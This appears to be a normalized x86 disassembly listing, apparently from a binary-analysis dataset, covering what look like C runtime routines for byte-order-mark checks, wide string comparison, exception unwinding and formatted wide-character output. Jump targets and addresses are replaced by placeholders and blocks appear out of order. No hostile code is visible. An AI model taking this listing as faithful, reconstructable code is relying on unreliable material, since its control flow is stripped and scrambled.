jg r-xdata
mov [ ebp - 0x14 ] 0xfeff
jmp r-xdata
jmp r-xdata
push 0x2
pop ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xfeff
jne r-xdata
push [ edi ]
call sub_42d197
pop ecx
call sub_427b11
push 0x16
pop ebx
mov [ eax ] ebx
jmp r-xdata
cmp ecx 0xbfbbef
jne r-xdata
cmp esi 0x4
jbe r-xdata
mov eax ecx
sub eax esi
push eax
lea eax [ ebp - 0x14 ]
add eax esi
push eax
push [ edi ]
call sub_42c027
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push ebx
push edx
push [ edi ]
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_42cb83
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ edi ]
call sub_42cb83
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_433bd5
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
movzx eax [ edx ]
movzx ecx [ ecx ]
sub eax ecx
pop esi
pop ebp
retn
movzx esi [ edx ]
test si si
je r-xdata
cmp si [ ecx ]
jne r-xdata
add edx 0x2
add ecx 0x2
jmp r-xdata
dec eax
je r-xdata
sub_433c0b
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push edi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_433cbf
add esp 0x10
mov edi [ ebp + 0x10 ]
xor eax eax
test edi edi
je r-xdata
pop edi
leave
retn
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov eax 0x7fffffff
jmp r-xdata
push ebx
push esi
push 0x41
pop ebx
push 0x5a
pop esi
sub edx ecx
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax [ edx + ecx ]
cmp ax bx
jb r-xdata
mov esi eax
cmp ax si
ja r-xdata
add ecx 0x2
dec edi
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
movzx ecx ax
movzx eax si
pop esi
sub eax ecx
pop ebx
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
sub_433cbf
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
xor esi esi
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
mov eax esi
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_4247f2
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xa8 ] esi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ ebx ]
push eax
call sub_43094a
movzx esi ax
lea eax [ ebp - 0x14 ]
push eax
movzx eax [ edi ]
push eax
call sub_43094a
add esp 0x10
dec [ ebp + 0x10 ]
movzx eax ax
lea ebx [ ebx + 0x2 ]
lea edi [ edi + 0x2 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
push 0x41
pop edx
push 0x5a
pop esi
sub ebx edi
mov [ ebp - 0x4 ] esi
jmp r-xdata
movzx eax ax
movzx esi si
sub esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test si si
je r-xdata
movzx eax [ ebx + edi ]
cmp ax dx
jb r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
mov esi eax
cmp ax si
ja r-xdata
add edi 0x2
dec ecx
je r-xdata
cmp ax [ ebp - 0x4 ]
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
test si si
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp ax dx
jb r-xdata
cmp si ax
je r-xdata
push 0x5a
pop esi
jmp r-xdata
sub_433dc0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433de0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_421ed7
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_433e25
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_433e25
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_433de0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_433ed5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_433ef4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_433ecc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_433ed5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_433ef7
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_433f4b
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_4247f2
call sub_427b11
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp [ ebp - 0x440 ] bl
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
shr eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_434b7f ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_434b9f
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
mov eax esi
mov edx ecx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
test edi edi
jle r-xdata
mov esi [ rw-data ]
push eax
call sub_422732
xor eax eax
pop ecx
mov [ ebp - 0x458 ] eax
push 0x20
pop ecx
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x418 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi eax
jg r-xdata
mov ecx [ edi - 0x4 ]
xor eax eax
mov edi eax
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp eax 0x78
je r-xdata
sub edx esi
xor eax eax
mov al [ eax ]
test al al
je r-xdata
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call sub_434c01
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push ecx
call sub_434bd5
mov eax [ ebp - 0x42c ]
add esp 0x10
test bl 0x1
je r-xdata
push 0x2d
cmp eax edx
jle r-xdata
push 0x67
pop eax
cmp cx ax
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x488 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x484 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x460 ]
movsx eax cl
push [ ebp - 0x418 ]
mov [ ebp - 0x40c ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x488 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
call sub_423351
test eax eax
je r-xdata
push 0x6f
pop ecx
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x418 ]
test edx edx
jns r-xdata
mov edi eax
jl r-xdata
cdq
mov ecx eax
mov edi edx
mov [ ebp - 0x414 ] edx
test ebx 0x800
je r-xdata
movzx eax [ edi ]
add edi 0x4
mov [ ebp - 0x430 ] 0x1
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x464 ] eax
test bl 0x20
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp ax [ ebp - 0x474 ]
je r-xdata
add edx 0x2
test edi edi
jne r-xdata
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_432c17
pop ecx
test eax eax
mov eax [ ebp - 0x41c ]
pop ecx
je r-xdata
cmp [ ebp - 0x430 ] 0x0
mov eax [ ebp - 0x414 ]
jne r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
push 0x2b
jmp r-xdata
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x418 ] 0x1
jmp r-xdata
push 0x67
pop eax
cmp [ ebp - 0x41c ] ax
jne r-xdata
cmp [ ebp - 0x418 ] 0x0
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x41c ] 0x8
test bl bl
jns r-xdata
and ebx 0xfffffff7
mov [ ebp - 0x410 ] ebx
cmp edx 0x200
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi eax
neg edi
or ebx 0x100
mov [ ebp - 0x410 ] ebx
cmp ecx eax
jae r-xdata
movsx edx [ eax ]
xor ecx ecx
mov [ ebp - 0x430 ] ecx
jmp r-xdata
movsx eax [ eax ]
cdq
sub eax edx
mov edx eax
mov [ ebp - 0x430 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x43c ] al
xor eax eax
mov [ ebp - 0x43b ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_434dff
add esp 0x10
test eax eax
jns r-xdata
xor eax eax
mov [ ebp - 0x434 ] eax
dec edi
cmp [ edx ] ax
je r-xdata
mov edx [ ebp - 0x414 ]
inc eax
inc edx
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] edx
cmp edx edi
jl r-xdata
inc eax
push [ ebp - 0x45c ]
lea ecx [ ebp - 0x420 ]
push ecx
push [ ebp - 0x428 ]
push eax
push esi
call sub_434c01
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x30
pop eax
push eax
call sub_434bd5
add esp 0x10
push 0x20
pop ecx
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x42c ] 0x1
lea edi [ eax + 0x15d ]
push edi
call sub_4266f1
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x410 ] ebx
jmp r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx 0x200
sar edx 0x1
xor edx edx
lea esi [ ebp - 0x404 ]
inc edx
jmp r-xdata
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
jmp r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x41c ] esi
mov edi [ ebp - 0x424 ]
mov eax [ ebp - 0x42c ]
sub edi edx
sub edi eax
test bl 0xc
jne r-xdata
mov [ ebp - 0x418 ] 0xa3
mov esi eax
mov [ ebp - 0x414 ] edi
jmp r-xdata
push esi
call sub_425610
pop ecx
mov edx eax
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x410 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
lea esi [ ebp - 0x205 ]
mov [ ebp - 0x42c ] eax
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push edi
push 0x20
pop eax
push eax
call sub_434bd5
add esp 0x10
or eax 0xffffffff
mov [ ebp - 0x420 ] eax
jmp r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
push [ ebp - 0x464 ]
call sub_434b9f
mov ecx [ ebp - 0x41c ]
add ecx [ ebp - 0x478 ]
mov eax [ ebp - 0x46c ]
add esp 0xc
mov [ ebp - 0x41c ] ecx
test eax eax
jg r-xdata
mov edi [ ebp - 0x40c ]
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ecx
call sub_434f10
add ecx 0x30
mov [ ebp - 0x46c ] ebx
mov [ ebp - 0x414 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
test eax eax
js r-xdata
dec eax
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0x74 ]
lea eax [ ebp - 0x464 ]
push ecx
push eax
call sub_434dff
add esp 0x10
mov [ ebp - 0x478 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov edx [ ebp - 0x418 ]
mov [ esi ] cl
mov ecx [ ebp - 0x414 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
mov ebx [ ebp - 0x410 ]
lea edx [ ebp - 0x205 ]
sub edx esi
inc esi
mov [ ebp - 0x414 ] edx
test ebx 0x200
je r-xdata
mov eax [ ebp - 0x420 ]
mov eax edx
dec edx
mov [ ebp - 0x418 ] edx
test eax eax
jg r-xdata
test edx edx
je r-xdata
dec esi
push 0x30
pop eax
mov [ esi ] al
inc edx
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
sub_434b9f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_434c7a
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
sub_434bd5
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_434b9f
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_434c01
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_434b9f
mov eax [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x2
add esp 0xc
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_434b9f
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_434c7a
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test [ edi + 0xc ] 0x40
jne r-xdata
add [ edi + 0x4 ] 0xfffffffe
js r-xdata
push edi
call sub_42b76c
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push edi
push eax
call sub_438690
pop ecx
pop ecx
mov ecx [ edi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ edi ] 0x2
jmp r-xdata
mov eax ebx
push edi
call sub_42b76c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
push edi
call sub_42b76c
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_42b76c
mov esi eax
push edi
sar esi 0x5
call sub_42b76c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
mov eax ebx
push edi
call sub_42b76c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push edi
call sub_42b76c
pop ecx
cmp eax 0xffffffff
je r-xdata
push edi
call sub_42b76c
mov esi eax
push edi
sar esi 0x5
call sub_42b76c
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ esi * 4 + rw-data ]
pop ecx
jmp r-xdata
test [ ebx + 0x4 ] 0x80
je r-xdata
push edi
call sub_42b76c
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4356bf
add esp 0x10
test eax eax
je r-xdata
push edi
call sub_42b76c
mov esi eax
push edi
sar esi 0x5
call sub_42b76c
mov ebx eax
and ebx 0x1f
pop ecx
shl ebx 0x6
add ebx [ esi * 4 + rw-data ]
pop ecx
xor esi esi
cmp [ ebp - 0x10 ] esi
jle r-xdata
mov eax 0xffff
jmp r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ edi + 0x4 ]
js r-xdata
movsx eax [ ebp + esi - 0xc ]
push edi
push eax
call sub_42a772
pop ecx
pop ecx
mov ecx eax
mov ecx [ edi ]
mov al [ ebp + esi - 0xc ]
mov [ ecx ] al
mov eax [ edi ]
movzx ecx [ eax ]
inc eax
mov [ edi ] eax
jmp r-xdata
inc esi
cmp esi [ ebp - 0x10 ]
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_434dff
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
